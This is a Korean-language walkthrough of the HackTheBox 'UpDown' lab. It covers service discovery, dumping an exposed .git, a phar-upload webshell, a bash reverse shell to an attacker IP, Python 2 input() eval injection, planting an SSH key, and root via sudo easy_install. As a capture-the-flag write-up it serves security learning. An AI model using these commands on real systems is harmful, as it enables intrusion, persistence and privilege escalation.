# UpDown - HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA updown 10.129.227.227
```
<img width="1202" height="450" alt="image" src="https://github.com/user-attachments/assets/885e73bb-e116-4355-8a2b-40d6b19ef13a" />

- SSH(22)
- HTTP(80)

---
## HTTP
### banner grabbing
<img width="1202" height="250" alt="image" src="https://github.com/user-attachments/assets/60a64b61-b906-4310-8f10-c39221ce157f" />

<br>
<br>

- `/etc/hosts`에 `siteisup.htb` 추가.
<img width="667" height="481" alt="image" src="https://github.com/user-attachments/assets/bd1a4a47-1eb9-46c6-9f6a-3ba9ca0f22b7" />

### VHOST
- `dev.siteisup.htb` 발견.
```bash
ffuf -w ~/util/subdomains.txt -u http://siteisup.htb -H 'Host:FUZZ.siteisup.htb' -mc all -fs 1131
```
<img width="1205" height="140" alt="image" src="https://github.com/user-attachments/assets/5ccfd7af-c6ee-4443-ba48-501cb5684db1" />

<br>
<br>

- `/etc/hosts`에 `dev.siteisup.htb`를 추가.
- 접속 시도하였으나 거부.
<img width="411" height="185" alt="image" src="https://github.com/user-attachments/assets/bf3c72bd-19e8-4d27-b689-7409606d067b" />

### PHAR
- `/dev` 경로에서 `.git`발견.
```bash
feroxbuster -u http://siteisup.htb -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -C 404 -x php,md,txt
```
<img width="1205" height="182" alt="image" src="https://github.com/user-attachments/assets/fcd0ff10-a942-47a3-ac37-48210a00cb8a" />

<br>
<br>

- `git-dumper`를 사용하여 덤핑.
```bash
git-dumper http://siteisup.htb/dev git
```
<img width="1205" height="270" alt="image" src="https://github.com/user-attachments/assets/ff7408a5-90db-415a-a7e1-39fbb8352a56" />

<br>
<br>

- `index.php`를 확인하니 `Admin Panel`로 연결되는 링크가 존재하는데 `siteisup.htb`에서는 존재하지 않음.
- `dev.siteisup.htb`에 존재하는 것으로 가정.
<img width="1205" height="318" alt="image" src="https://github.com/user-attachments/assets/8808bdf8-b3b2-40ac-b6c1-a8f6d68a318c" />

<br>
<br>

- `.htaccess`에서 `Special-Dev`헤더에 값이 `only4dev`로 설정되어야 허용된다는 것을 확인.
<img width="1205" height="142" alt="image" src="https://github.com/user-attachments/assets/87c48537-7acc-486e-9acd-0b9ddf70186a" />

<br>
<br>

- `burpsuite`에서 `Special-Dev: only4dev`헤더를 설정.
<img width="1374" height="433" alt="image" src="https://github.com/user-attachments/assets/f40d108f-36d4-4e08-b7c4-2dc9c3f46ad6" />

<br>
<br>

- `dev.siteisup.htb`에 접속이 가능해짐.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/31911cbc-a5a9-4d11-83d1-9c675cd877d8" />

<br>
<br>

- `Admin Panel`에 접속.
<img width="463" height="101" alt="image" src="https://github.com/user-attachments/assets/c5967aaa-c2bb-4a06-9db0-f063a106eb25" />

<br>
<br>

- `index.php`에서 `php`확장자를 마지막에 붙여서 원격의 파일을 불러오는 것으로 확인.
- 파일명을 설정해주지 않으면 `checker.php`를 불러옴.
<img width="1205" height="311" alt="image" src="https://github.com/user-attachments/assets/00484986-ea55-4eaf-9f36-c7e1880d0cb8" />

<br>
<br>

- `checkerp.php`가 `dev.siteisup.htb`의 메인페이지.
- 파일을 선택해서 check 버튼을 누를시 파일을 업로드하는 과정이 있는데 파일 확장자 중 `phar`확장자로는 업로드가 가능할 것으로 보임.
<img width="1205" height="519" alt="image" src="https://github.com/user-attachments/assets/351337b4-f155-49ff-bd68-32ef2eff51ae" />

<br>
<br>

- `info.php` 생성.
<img width="1205" height="81" alt="image" src="https://github.com/user-attachments/assets/08cf3bc5-95d6-4a8a-a8ea-67d1c8fa06c2" />

<br>
<br>

- `info.phar`로 압축.
<img width="1205" height="81" alt="image" src="https://github.com/user-attachments/assets/1f67c855-a3dd-4058-9047-927933021bd5" />

<br>
<br>

- `info.phar`를 업로드하여 `/uploads`경로에서 폴더가 생성된 것을 확인.
<img width="572" height="259" alt="image" src="https://github.com/user-attachments/assets/536c1276-03e8-46b2-a42c-f68598615b0b" />

<br>
<br>

- `info.phar` 발견.
<img width="759" height="260" alt="image" src="https://github.com/user-attachments/assets/a35c480d-d75d-4246-a27a-c1e35dd48a72" />

<br>
<br>

- `Admin Panel`에서 `phar`확장자를 실행.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/0d06df24-9772-43d0-99c0-7f60e98390f6" />

<br>
<br>

- 허용되지 않는 함수 확인.
<img width="934" height="147" alt="image" src="https://github.com/user-attachments/assets/67233bb2-1760-452c-965b-f2267b3e5d12" />

<br>
<br>

- `http://dev.siteisup.htb/?page=phar://uploads/b67c93820b345f67f1c54f933bbd675f/info.phar/info`요청의 응답을 `burpsuite`로 가로채서 파일로 생성.(Copy to file)
<img width="1544" height="398" alt="image" src="https://github.com/user-attachments/assets/c78eb043-7135-490f-85ca-1c57ce9ff6d7" />

<br>
<br>

- https://github.com/teambi0s/dfunc-bypasser
- `proc_open`함수를 사용 가능.
```bash
python2 dfunc-bypasser.py --file res
```
<img width="1204" height="530" alt="image" src="https://github.com/user-attachments/assets/11b7cf15-0d4b-4f2d-a33f-b0064dd2fcbf" />

<br>
<br>

- https://github.com/d4rkiZ/ProcOpen-PHP-Webshell
- `proc_open` 웹셸을 `phar`로 생성.
<img width="1204" height="74" alt="image" src="https://github.com/user-attachments/assets/7a43fe25-e4ef-4d7c-828c-e2b7b349f814" />

<br>
<br>

- 업로드한 후 명령어 실행 성공.
<img width="904" height="312" alt="image" src="https://github.com/user-attachments/assets/c5bdc709-532e-4d38-b0a8-bbdb42199d7b" />

<br>
<br>

- 리버스 셸 실행.
```bash
bash -c 'bash -i >&/dev/tcp/10.10.14.18/80 0>&1'
```
<img width="904" height="312" alt="image" src="https://github.com/user-attachments/assets/7e07fff3-7a5e-4953-9b7f-92d425c0a052" />

<br>
<br>

- 셸 획득.
<img width="1204" height="202" alt="image" src="https://github.com/user-attachments/assets/f4fa50dc-ba57-4e24-81e7-9b2424f5b1eb" />

---

## Shell as developer
- `/home/developer/dev` 폴더 접근 가능.
- `siteisup`에 SUID가 설정되어 있음.
<img width="1204" height="135" alt="image" src="https://github.com/user-attachments/assets/dce0bc40-743b-4cfa-b430-4e44bbe07e95" />

<br>
<br>

- `siteisup`을 실행하면 `siteisup_test.py`가 실행되는 것처럼 보임.
<img width="1204" height="202" alt="image" src="https://github.com/user-attachments/assets/8b294026-7d10-4e42-8d05-7e185c3b2929" />
<img width="1204" height="99" alt="image" src="https://github.com/user-attachments/assets/3d261bcd-847c-4835-9fef-c98df3527b64" />

<br>
<br>

- 로컬로 `siteisup`을 다운로드받아 ghidra로 분석.
- `/usr/bin/python`으로 `siteisup_test.py`를 실행.
<img width="464" height="246" alt="image" src="https://github.com/user-attachments/assets/7573f7f0-3e08-46ec-b1b1-901c4a941c8c" />

<br>
<br>

- `/usr/bin/python`는 `python2`로 링크가 걸려 있음.
<img width="1204" height="49" alt="image" src="https://github.com/user-attachments/assets/8c6af8e7-e1b3-4764-9f0d-e1d4b81c3d80" />

<br>
<br>

- `python2`의 경우 `input`함수는 자동적으로 `eval`를 실행시킴.
- 명령어실행 가능.
```python3
__import__('os').system('whoami')
```
<img width="1204" height="112" alt="image" src="https://github.com/user-attachments/assets/935f92db-4a66-4b93-90be-0941536f8234" />

<br>
<br>

- 셸 획득.
```python3
__import__('os').system('/bin/bash')
```
<img width="1204" height="134" alt="image" src="https://github.com/user-attachments/assets/526afd16-33cb-412a-bcd7-ec54dacabfb1" />

<br>
<br>

- 로컬의 공개키 저장.
```bash
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILlrEsIjppVET3pJThtlxxe4AHDn2FcASFqe3oQQNwvl kali@kali' >>authorized_keys
```
<img width="1204" height="47" alt="image" src="https://github.com/user-attachments/assets/b2583dc2-b460-4862-802b-a97e44e389ff" />

<br>
<br>

- SSH 접속
<img width="1204" height="47" alt="image" src="https://github.com/user-attachments/assets/ded7ff94-1f60-4814-a4d3-0e99ac5024fb" />

---
## Privesc
- `easy_install`를 root 권한으로 실행 가능.
<img width="1206" height="135" alt="image" src="https://github.com/user-attachments/assets/96161b19-e785-43ea-8949-139ba9bf19f1" />

<br>
<br>

- https://gtfobins.org/gtfobins/easy_install/
- `setup.py` 생성.
```python3
import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")
```
<img width="1206" height="49" alt="image" src="https://github.com/user-attachments/assets/e50cce99-cbfc-400a-a7bc-f76fea108cb2" />

<br>
<br>

- 셸 획득.
```bash
sudo /usr/local/bin/easy_install .
```
<img width="1206" height="155" alt="image" src="https://github.com/user-attachments/assets/5200905a-abff-4972-b512-6417e9b0936e" />

---
## FLAG
- `/home/developer/user.txt`
<img width="1206" height="287" alt="image" src="https://github.com/user-attachments/assets/3fb92174-4da2-4e5f-be93-56c7d25ed32d" />

<br>
<br>

- `/root/root.txt`
<img width="1206" height="313" alt="image" src="https://github.com/user-attachments/assets/9a5e50cb-8c11-48bd-bdbf-6900f7600e10" />
